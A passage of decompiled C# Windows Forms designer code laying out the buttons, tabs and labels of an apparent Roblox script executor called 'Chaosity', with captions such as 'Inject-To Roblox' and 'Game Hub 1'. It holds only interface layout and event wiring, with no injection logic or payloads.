      this.button17.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button17.FlatStyle = FlatStyle.Flat;
      this.button17.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button17.ForeColor = System.Drawing.Color.White;
      this.button17.Location = new Point(12, 275);
      this.button17.Name = "button17";
      this.button17.Size = new Size(84, 25);
      this.button17.TabIndex = 54;
      this.button17.Text = "Execute";
      this.button17.UseVisualStyleBackColor = false;
      this.button17.Visible = false;
      this.button17.Click += new EventHandler(this.button17_Click_1);
      this.Settings.BackColor = System.Drawing.Color.Black;
      this.Settings.Controls.Add((Control) this.button67);
      this.Settings.Controls.Add((Control) this.button64);
      this.Settings.Controls.Add((Control) this.checkBox3);
      this.Settings.Controls.Add((Control) this.button21);
      this.Settings.Controls.Add((Control) this.button10);
      this.Settings.Controls.Add((Control) this.button29);
      this.Settings.Controls.Add((Control) this.button19);
      this.Settings.Controls.Add((Control) this.button28);
      this.Settings.Controls.Add((Control) this.cb2);
      this.Settings.Location = new Point(4, 22);
      this.Settings.Name = "Settings";
      this.Settings.Padding = new Padding(3);
      this.Settings.Size = new Size(603, 306);
      this.Settings.TabIndex = 1;
      this.Settings.Text = "Settings";
      this.Settings.Click += new EventHandler(this.InjectionMenu_Click);
      this.button67.BackColor = System.Drawing.Color.Transparent;
      this.button67.Cursor = Cursors.Hand;
      this.button67.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button67.FlatAppearance.BorderSize = 3;
      this.button67.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button67.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button67.FlatStyle = FlatStyle.Flat;
      this.button67.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button67.ForeColor = System.Drawing.Color.White;
      this.button67.Location = new Point(447, 23);
      this.button67.Name = "button67";
      this.button67.Size = new Size(135, 34);
      this.button67.TabIndex = 133;
      this.button67.Text = "Kill ROBLOX";
      this.button67.UseVisualStyleBackColor = false;
      this.button67.Click += new EventHandler(this.button67_Click);
      this.button64.BackColor = System.Drawing.Color.Transparent;
      this.button64.Cursor = Cursors.Hand;
      this.button64.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button64.FlatAppearance.BorderSize = 3;
      this.button64.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button64.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button64.FlatStyle = FlatStyle.Flat;
      this.button64.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button64.ForeColor = System.Drawing.Color.White;
      this.button64.Location = new Point(457, 218);
      this.button64.Name = "button64";
      this.button64.Size = new Size(135, 34);
      this.button64.TabIndex = 131;
      this.button64.Text = "Go To Premium-Page";
      this.button64.UseVisualStyleBackColor = false;
      this.button64.Visible = false;
      this.checkBox3.FlatAppearance.BorderSize = 0;
      this.checkBox3.Font = new Font("Roboto", 9f, FontStyle.Bold);
      this.checkBox3.Location = new Point(447, 103);
      this.checkBox3.Name = "checkBox3";
      this.checkBox3.Size = new Size(135, 23);
      this.checkBox3.TabIndex = 129;
      this.checkBox3.Text = "Disable Monaco";
      this.checkBox3.UseVisualStyleBackColor = true;
      this.checkBox3.CheckedChanged += new EventHandler(this.checkBox3_CheckedChanged_3);
      this.button21.BackColor = System.Drawing.Color.Transparent;
      this.button21.Cursor = Cursors.Hand;
      this.button21.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button21.FlatAppearance.BorderSize = 3;
      this.button21.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button21.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button21.FlatStyle = FlatStyle.Flat;
      this.button21.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button21.ForeColor = System.Drawing.Color.White;
      this.button21.Location = new Point(457, 258);
      this.button21.Name = "button21";
      this.button21.Size = new Size(135, 34);
      this.button21.TabIndex = (int) sbyte.MaxValue;
      this.button21.Text = "Back To Main-Page";
      this.button21.UseVisualStyleBackColor = false;
      this.button21.Click += new EventHandler(this.button21_Click);
      this.button10.BackColor = System.Drawing.Color.Transparent;
      this.button10.Cursor = Cursors.Hand;
      this.button10.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button10.FlatAppearance.BorderSize = 3;
      this.button10.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button10.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button10.FlatStyle = FlatStyle.Flat;
      this.button10.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button10.ForeColor = System.Drawing.Color.White;
      this.button10.Location = new Point(447, 63);
      this.button10.Name = "button10";
      this.button10.Size = new Size(135, 34);
      this.button10.TabIndex = 123;
      this.button10.Text = "Multiple ROBLOX";
      this.button10.UseVisualStyleBackColor = false;
      this.button10.Click += new EventHandler(this.button10_Click_1);
      this.button29.BackColor = System.Drawing.Color.Transparent;
      this.button29.Cursor = Cursors.Hand;
      this.button29.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button29.FlatAppearance.BorderSize = 3;
      this.button29.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button29.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button29.FlatStyle = FlatStyle.Flat;
      this.button29.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button29.ForeColor = System.Drawing.Color.White;
      this.button29.Location = new Point(165, 23);
      this.button29.Name = "button29";
      this.button29.Size = new Size(135, 34);
      this.button29.TabIndex = 122;
      this.button29.Text = "Fix Injection Errors";
      this.button29.UseVisualStyleBackColor = false;
      this.button29.Click += new EventHandler(this.button29_Click);
      this.button19.BackColor = System.Drawing.Color.Transparent;
      this.button19.Cursor = Cursors.Hand;
      this.button19.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button19.FlatAppearance.BorderSize = 3;
      this.button19.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button19.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button19.FlatStyle = FlatStyle.Flat;
      this.button19.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button19.ForeColor = System.Drawing.Color.White;
      this.button19.Location = new Point(24, 23);
      this.button19.Name = "button19";
      this.button19.Size = new Size(135, 34);
      this.button19.TabIndex = 121;
      this.button19.Text = "Inject-To Roblox";
      this.button19.UseVisualStyleBackColor = false;
      this.button19.Click += new EventHandler(this.button19_Click_1);
      this.button28.BackColor = System.Drawing.Color.Transparent;
      this.button28.Cursor = Cursors.Hand;
      this.button28.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button28.FlatAppearance.BorderSize = 3;
      this.button28.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button28.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button28.FlatStyle = FlatStyle.Flat;
      this.button28.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button28.ForeColor = System.Drawing.Color.White;
      this.button28.Location = new Point(306, 23);
      this.button28.Name = "button28";
      this.button28.Size = new Size(135, 34);
      this.button28.TabIndex = 120;
      this.button28.Text = "Re-Install ROBLOX";
      this.button28.UseVisualStyleBackColor = false;
      this.button28.Click += new EventHandler(this.button28_Click);
      this.PremiumGames.BackColor = System.Drawing.Color.Black;
      this.PremiumGames.Controls.Add((Control) this.label15);
      this.PremiumGames.Controls.Add((Control) this.button27);
      this.PremiumGames.Controls.Add((Control) this.button22);
      this.PremiumGames.Controls.Add((Control) this.button23);
      this.PremiumGames.Controls.Add((Control) this.button24);
      this.PremiumGames.Controls.Add((Control) this.button25);
      this.PremiumGames.Controls.Add((Control) this.button26);
      this.PremiumGames.Controls.Add((Control) this.flowLayoutPanel1);
      this.PremiumGames.Location = new Point(4, 22);
      this.PremiumGames.Name = "PremiumGames";
      this.PremiumGames.Size = new Size(603, 306);
      this.PremiumGames.TabIndex = 4;
      this.PremiumGames.Text = "PremiumGames";
      this.PremiumGames.Click += new EventHandler(this.PremiumGames_Click);
      this.label15.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.label15.Location = new Point(163, 139);
      this.label15.Name = "label15";
      this.label15.Size = new Size(429, 158);
      this.label15.TabIndex = 123;
      this.label15.TextAlign = ContentAlignment.TopCenter;
      this.label15.Click += new EventHandler(this.label15_Click);
      this.button27.BackColor = System.Drawing.Color.Transparent;
      this.button27.Cursor = Cursors.Hand;
      this.button27.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button27.FlatAppearance.BorderSize = 3;
      this.button27.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button27.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button27.FlatStyle = FlatStyle.Flat;
      this.button27.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button27.ForeColor = System.Drawing.Color.White;
      this.button27.Location = new Point(448, 66);
      this.button27.Name = "button27";
      this.button27.Size = new Size(135, 34);
      this.button27.TabIndex = 122;
      this.button27.Text = "Multiple Roblox";
      this.button27.UseVisualStyleBackColor = false;
      this.button27.Click += new EventHandler(this.button27_Click);
      this.button22.BackColor = System.Drawing.Color.Transparent;
      this.button22.Cursor = Cursors.Hand;
      this.button22.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button22.FlatAppearance.BorderSize = 3;
      this.button22.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button22.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button22.FlatStyle = FlatStyle.Flat;
      this.button22.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button22.ForeColor = System.Drawing.Color.White;
      this.button22.Location = new Point(307, 66);
      this.button22.Name = "button22";
      this.button22.Size = new Size(135, 34);
      this.button22.TabIndex = 120;
      this.button22.Text = "Main Executor";
      this.button22.UseVisualStyleBackColor = false;
      this.button22.Click += new EventHandler(this.button22_Click);
      this.button23.BackColor = System.Drawing.Color.Transparent;
      this.button23.Cursor = Cursors.Hand;
      this.button23.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button23.FlatAppearance.BorderSize = 3;
      this.button23.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button23.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button23.FlatStyle = FlatStyle.Flat;
      this.button23.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button23.ForeColor = System.Drawing.Color.White;
      this.button23.Location = new Point(166, 66);
      this.button23.Name = "button23";
      this.button23.Size = new Size(135, 34);
      this.button23.TabIndex = 119;
      this.button23.Text = "Fix Injection Errors";
      this.button23.UseVisualStyleBackColor = false;
      this.button23.Click += new EventHandler(this.button23_Click);
      this.button24.BackColor = System.Drawing.Color.Transparent;
      this.button24.Cursor = Cursors.Hand;
      this.button24.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button24.FlatAppearance.BorderSize = 3;
      this.button24.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button24.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button24.FlatStyle = FlatStyle.Flat;
      this.button24.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button24.ForeColor = System.Drawing.Color.White;
      this.button24.Location = new Point(307, 26);
      this.button24.Name = "button24";
      this.button24.Size = new Size(135, 34);
      this.button24.TabIndex = 118;
      this.button24.Text = "Kill Roblox";
      this.button24.UseVisualStyleBackColor = false;
      this.button24.Click += new EventHandler(this.button24_Click);
      this.button25.BackColor = System.Drawing.Color.Transparent;
      this.button25.Cursor = Cursors.Hand;
      this.button25.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button25.FlatAppearance.BorderSize = 3;
      this.button25.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button25.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button25.FlatStyle = FlatStyle.Flat;
      this.button25.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button25.ForeColor = System.Drawing.Color.White;
      this.button25.Location = new Point(448, 26);
      this.button25.Name = "button25";
      this.button25.Size = new Size(135, 34);
      this.button25.TabIndex = 117;
      this.button25.Text = "Re-Install Roblox";
      this.button25.UseVisualStyleBackColor = false;
      this.button25.Click += new EventHandler(this.button25_Click);
      this.button26.BackColor = System.Drawing.Color.Transparent;
      this.button26.Cursor = Cursors.Hand;
      this.button26.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button26.FlatAppearance.BorderSize = 3;
      this.button26.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button26.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button26.FlatStyle = FlatStyle.Flat;
      this.button26.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button26.ForeColor = System.Drawing.Color.White;
      this.button26.Location = new Point(166, 26);
      this.button26.Name = "button26";
      this.button26.Size = new Size(135, 34);
      this.button26.TabIndex = 116;
      this.button26.Text = "Inject To Roblox";
      this.button26.UseVisualStyleBackColor = false;
      this.button26.Click += new EventHandler(this.button26_Click);
      this.flowLayoutPanel1.AutoScroll = true;
      this.flowLayoutPanel1.Controls.Add((Control) this.panel2);
      this.flowLayoutPanel1.Controls.Add((Control) this.panel5);
      this.flowLayoutPanel1.Controls.Add((Control) this.panel7);
      this.flowLayoutPanel1.Controls.Add((Control) this.panel8);
      this.flowLayoutPanel1.Controls.Add((Control) this.panel9);
      this.flowLayoutPanel1.Location = new Point(15, 26);
      this.flowLayoutPanel1.Name = "flowLayoutPanel1";
      this.flowLayoutPanel1.Size = new Size(132, 268);
      this.flowLayoutPanel1.TabIndex = 10;
      this.flowLayoutPanel1.Paint += new PaintEventHandler(this.flowLayoutPanel1_Paint);
      this.panel2.Controls.Add((Control) this.pictureBox1);
      this.panel2.Controls.Add((Control) this.label14);
      this.panel2.Location = new Point(3, 3);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(105, 125);
      this.panel2.TabIndex = 18;
      this.pictureBox1.BackgroundImageLayout = ImageLayout.Stretch;
      this.pictureBox1.Location = new Point(3, 3);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(100, 100);
      this.pictureBox1.TabIndex = 2;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click_1);
      this.label14.Font = new Font("Segoe UI Semilight", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label14.ForeColor = System.Drawing.Color.White;
      this.label14.ImageAlign = ContentAlignment.TopCenter;
      this.label14.Location = new Point(4, 106);
      this.label14.Name = "label14";
      this.label14.Size = new Size(98, 19);
      this.label14.TabIndex = 1;
      this.label14.Text = "Universal Scripts";
      this.label14.TextAlign = ContentAlignment.MiddleCenter;
      this.label14.Click += new EventHandler(this.label14_Click);
      this.panel5.Controls.Add((Control) this.pictureBox6);
      this.panel5.Controls.Add((Control) this.label8);
      this.panel5.Location = new Point(3, 134);
      this.panel5.Name = "panel5";
      this.panel5.Size = new Size(105, 125);
      this.panel5.TabIndex = 13;
      this.pictureBox6.BackgroundImageLayout = ImageLayout.Stretch;
      this.pictureBox6.Location = new Point(3, 3);
      this.pictureBox6.Name = "pictureBox6";
      this.pictureBox6.Size = new Size(100, 100);
      this.pictureBox6.TabIndex = 2;
      this.pictureBox6.TabStop = false;
      this.pictureBox6.Click += new EventHandler(this.pictureBox6_Click);
      this.label8.Font = new Font("Segoe UI Semilight", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label8.ForeColor = System.Drawing.Color.White;
      this.label8.Location = new Point(4, 106);
      this.label8.Name = "label8";
      this.label8.Size = new Size(98, 19);
      this.label8.TabIndex = 1;
      this.label8.Text = "Jailbreak";
      this.label8.TextAlign = ContentAlignment.MiddleCenter;
      this.label8.Click += new EventHandler(this.label8_Click);
      this.panel7.Controls.Add((Control) this.pictureBox7);
      this.panel7.Controls.Add((Control) this.label9);
      this.panel7.Location = new Point(3, 265);
      this.panel7.Name = "panel7";
      this.panel7.Size = new Size(105, 125);
      this.panel7.TabIndex = 15;
      this.panel7.Visible = false;
      this.pictureBox7.BackgroundImageLayout = ImageLayout.Stretch;
      this.pictureBox7.Location = new Point(2, 3);
      this.pictureBox7.Name = "pictureBox7";
      this.pictureBox7.Size = new Size(100, 100);
      this.pictureBox7.TabIndex = 3;
      this.pictureBox7.TabStop = false;
      this.label9.Font = new Font("Segoe UI Semilight", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label9.ForeColor = System.Drawing.Color.White;
      this.label9.Location = new Point(4, 106);
      this.label9.Name = "label9";
      this.label9.Size = new Size(98, 19);
      this.label9.TabIndex = 1;
      this.label9.Text = "Arsenal";
      this.label9.TextAlign = ContentAlignment.MiddleCenter;
      this.panel8.Controls.Add((Control) this.pictureBox8);
      this.panel8.Controls.Add((Control) this.label10);
      this.panel8.Location = new Point(3, 396);
      this.panel8.Name = "panel8";
      this.panel8.Size = new Size(105, 143);
      this.panel8.TabIndex = 16;
      this.panel8.Visible = false;
      this.pictureBox8.BackgroundImageLayout = ImageLayout.Stretch;
      this.pictureBox8.Location = new Point(3, 3);
      this.pictureBox8.Name = "pictureBox8";
      this.pictureBox8.Size = new Size(100, 100);
      this.pictureBox8.TabIndex = 4;
      this.pictureBox8.TabStop = false;
      this.label10.Font = new Font("Segoe UI Semilight", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label10.ForeColor = System.Drawing.Color.White;
      this.label10.Location = new Point(4, 106);
      this.label10.Name = "label10";
      this.label10.Size = new Size(98, 34);
      this.label10.TabIndex = 1;
      this.label10.Text = "Anime Fighting Simulator";
      this.label10.TextAlign = ContentAlignment.MiddleCenter;
      this.panel9.Controls.Add((Control) this.pictureBox9);
      this.panel9.Controls.Add((Control) this.label11);
      this.panel9.Location = new Point(3, 545);
      this.panel9.Name = "panel9";
      this.panel9.Size = new Size(105, 141);
      this.panel9.TabIndex = 17;
      this.panel9.Visible = false;
      this.pictureBox9.BackgroundImageLayout = ImageLayout.Stretch;
      this.pictureBox9.Location = new Point(3, 3);
      this.pictureBox9.Name = "pictureBox9";
      this.pictureBox9.Size = new Size(100, 100);
      this.pictureBox9.TabIndex = 5;
      this.pictureBox9.TabStop = false;
      this.label11.Font = new Font("Segoe UI Semilight", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label11.ForeColor = System.Drawing.Color.White;
      this.label11.Location = new Point(4, 106);
      this.label11.Name = "label11";
      this.label11.Size = new Size(98, 31);
      this.label11.TabIndex = 1;
      this.label11.Text = "Bubble Gum Simulator";
      this.label11.TextAlign = ContentAlignment.MiddleCenter;
      this.GameHubs.BackColor = System.Drawing.Color.Black;
      this.GameHubs.Controls.Add((Control) this.label13);
      this.GameHubs.Controls.Add((Control) this.label12);
      this.GameHubs.Controls.Add((Control) this.label6);
      this.GameHubs.Controls.Add((Control) this.label5);
      this.GameHubs.Controls.Add((Control) this.label4);
      this.GameHubs.Controls.Add((Control) this.label3);
      this.GameHubs.Controls.Add((Control) this.button13);
      this.GameHubs.Controls.Add((Control) this.button12);
      this.GameHubs.Controls.Add((Control) this.button11);
      this.GameHubs.Controls.Add((Control) this.button9);
      this.GameHubs.Controls.Add((Control) this.button30);
      this.GameHubs.Controls.Add((Control) this.button16);
      this.GameHubs.Controls.Add((Control) this.button69);
      this.GameHubs.Location = new Point(4, 22);
      this.GameHubs.Name = "GameHubs";
      this.GameHubs.Size = new Size(603, 306);
      this.GameHubs.TabIndex = 2;
      this.GameHubs.Text = "`";
      this.GameHubs.Click += new EventHandler(this.GameHubs_Click);
      this.label13.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label13.Location = new Point(159, 154);
      this.label13.Name = "label13";
      this.label13.Size = new Size(132, 47);
      this.label13.TabIndex = 69;
      this.label13.Text = "<-- Over 100+ Custom Made Scripts";
      this.label13.TextAlign = ContentAlignment.MiddleCenter;
      this.label13.Click += new EventHandler(this.label13_Click);
      this.label12.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label12.Location = new Point(21, 218);
      this.label12.Name = "label12";
      this.label12.Size = new Size(132, 23);
      this.label12.TabIndex = 67;
      this.label12.Text = "Premium Commands";
      this.label12.TextAlign = ContentAlignment.MiddleCenter;
      this.label12.Click += new EventHandler(this.label12_Click);
      this.label6.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label6.Location = new Point(159, 104);
      this.label6.Name = "label6";
      this.label6.Size = new Size(132, 23);
      this.label6.TabIndex = 58;
      this.label6.Text = "Over 200+ Games";
      this.label6.TextAlign = ContentAlignment.MiddleCenter;
      this.label6.Click += new EventHandler(this.label6_Click);
      this.label5.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label5.Location = new Point(435, 102);
      this.label5.Name = "label5";
      this.label5.Size = new Size(129, 23);
      this.label5.TabIndex = 56;
      this.label5.Text = "Over 100+ Games";
      this.label5.TextAlign = ContentAlignment.MiddleCenter;
      this.label5.Click += new EventHandler(this.label5_Click);
      this.label4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label4.Location = new Point(297, 104);
      this.label4.Name = "label4";
      this.label4.Size = new Size(132, 23);
      this.label4.TabIndex = 55;
      this.label4.Text = "Over 100+ Games";
      this.label4.TextAlign = ContentAlignment.MiddleCenter;
      this.label4.Click += new EventHandler(this.label4_Click);
      this.label3.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(21, 104);
      this.label3.Name = "label3";
      this.label3.Size = new Size(132, 23);
      this.label3.TabIndex = 54;
      this.label3.Text = "Over 1000+ Games";
      this.label3.TextAlign = ContentAlignment.MiddleCenter;
      this.label3.Click += new EventHandler(this.label3_Click);
      this.button13.BackColor = System.Drawing.Color.Black;
      this.button13.Cursor = Cursors.Hand;
      this.button13.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button13.FlatAppearance.BorderSize = 0;
      this.button13.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button13.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button13.FlatStyle = FlatStyle.Flat;
      this.button13.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button13.ForeColor = System.Drawing.Color.White;
      this.button13.Location = new Point(451, 267);
      this.button13.Name = "button13";
      this.button13.Size = new Size(132, 25);
      this.button13.TabIndex = 49;
      this.button13.Text = "Back To Main-Page";
      this.button13.UseVisualStyleBackColor = false;
      this.button13.Click += new EventHandler(this.button13_Click);
      this.button12.BackColor = System.Drawing.Color.Black;
      this.button12.BackgroundImageLayout = ImageLayout.Stretch;
      this.button12.Cursor = Cursors.Hand;
      this.button12.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button12.FlatAppearance.BorderSize = 2;
      this.button12.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button12.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button12.FlatStyle = FlatStyle.Flat;
      this.button12.Font = new Font("Roboto", 10f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button12.ForeColor = System.Drawing.Color.White;
      this.button12.Location = new Point(435, 28);
      this.button12.Name = "button12";
      this.button12.Size = new Size(129, 71);
      this.button12.TabIndex = 66;
      this.button12.Text = "Game Hub 4";
      this.button12.UseVisualStyleBackColor = false;
      this.button12.Click += new EventHandler(this.button12_Click_1);
      this.button11.BackColor = System.Drawing.Color.Black;
      this.button11.BackgroundImageLayout = ImageLayout.Stretch;
      this.button11.Cursor = Cursors.Hand;
      this.button11.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button11.FlatAppearance.BorderSize = 2;
      this.button11.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button11.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button11.FlatStyle = FlatStyle.Flat;
      this.button11.Font = new Font("Roboto", 10f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button11.ForeColor = System.Drawing.Color.White;
      this.button11.Location = new Point(300, 28);
      this.button11.Name = "button11";
      this.button11.Size = new Size(129, 71);
      this.button11.TabIndex = 65;
      this.button11.Text = "Game Hub 3";
      this.button11.UseVisualStyleBackColor = false;
      this.button11.Click += new EventHandler(this.button11_Click_1);
      this.button9.BackColor = System.Drawing.Color.Black;
      this.button9.BackgroundImageLayout = ImageLayout.Stretch;
      this.button9.Cursor = Cursors.Hand;
      this.button9.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button9.FlatAppearance.BorderSize = 2;
      this.button9.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button9.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button9.FlatStyle = FlatStyle.Flat;
      this.button9.Font = new Font("Roboto", 10f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button9.ForeColor = System.Drawing.Color.White;
      this.button9.Location = new Point(162, 28);
      this.button9.Name = "button9";
      this.button9.Size = new Size(129, 71);
      this.button9.TabIndex = 64;
      this.button9.Text = "Game Hub 2";
      this.button9.UseVisualStyleBackColor = false;
      this.button9.Click += new EventHandler(this.button9_Click_1);
      this.button30.BackColor = System.Drawing.Color.Black;
      this.button30.BackgroundImageLayout = ImageLayout.Stretch;
      this.button30.Cursor = Cursors.Hand;
      this.button30.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button30.FlatAppearance.BorderSize = 2;
      this.button30.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button30.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button30.FlatStyle = FlatStyle.Flat;
      this.button30.Font = new Font("Roboto", 9.5f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button30.ForeColor = System.Drawing.Color.White;
      this.button30.Location = new Point(21, 142);
      this.button30.Name = "button30";
      this.button30.Size = new Size(132, 71);
      this.button30.TabIndex = 70;
      this.button30.Text = "Chaosity Premium";
      this.button30.UseVisualStyleBackColor = false;
      this.button30.Click += new EventHandler(this.button30_Click_1);
      this.button16.BackColor = System.Drawing.Color.Black;
      this.button16.BackgroundImageLayout = ImageLayout.Stretch;
      this.button16.Cursor = Cursors.Hand;
      this.button16.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button16.FlatAppearance.BorderSize = 2;
      this.button16.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button16.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button16.FlatStyle = FlatStyle.Flat;
      this.button16.Font = new Font("Roboto", 9.5f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button16.ForeColor = System.Drawing.Color.White;
      this.button16.Location = new Point(21, 142);
      this.button16.Name = "button16";
      this.button16.Size = new Size(132, 71);
      this.button16.TabIndex = 68;
      this.button16.Text = "Chaosity Premium";
      this.button16.UseVisualStyleBackColor = false;
      this.button16.Click += new EventHandler(this.button16_Click_1);
      this.button69.BackColor = System.Drawing.Color.Black;
      this.button69.BackgroundImageLayout = ImageLayout.Stretch;
      this.button69.Cursor = Cursors.Hand;
      this.button69.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button69.FlatAppearance.BorderSize = 2;
      this.button69.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button69.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button69.FlatStyle = FlatStyle.Flat;
      this.button69.Font = new Font("Roboto", 10f, FontStyle.Bold | FontStyle.Italic | FontStyle.Underline);
      this.button69.ForeColor = System.Drawing.Color.White;
      this.button69.Location = new Point(21, 28);
      this.button69.Name = "button69";
      this.button69.Size = new Size(132, 71);
      this.button69.TabIndex = 71;
      this.button69.Text = "Game Hub 1";
      this.button69.UseVisualStyleBackColor = false;
      this.button69.Click += new EventHandler(this.button69_Click);
      this.PremiumScripts.BackColor = System.Drawing.Color.Black;
      this.PremiumScripts.Controls.Add((Control) this.button32);
      this.PremiumScripts.Controls.Add((Control) this.button18);
      this.PremiumScripts.Location = new Point(4, 22);
      this.PremiumScripts.Name = "PremiumScripts";
      this.PremiumScripts.Size = new Size(603, 306);
      this.PremiumScripts.TabIndex = 7;
      this.PremiumScripts.Text = "PremiumScripts";
      this.button32.BackColor = System.Drawing.Color.Black;
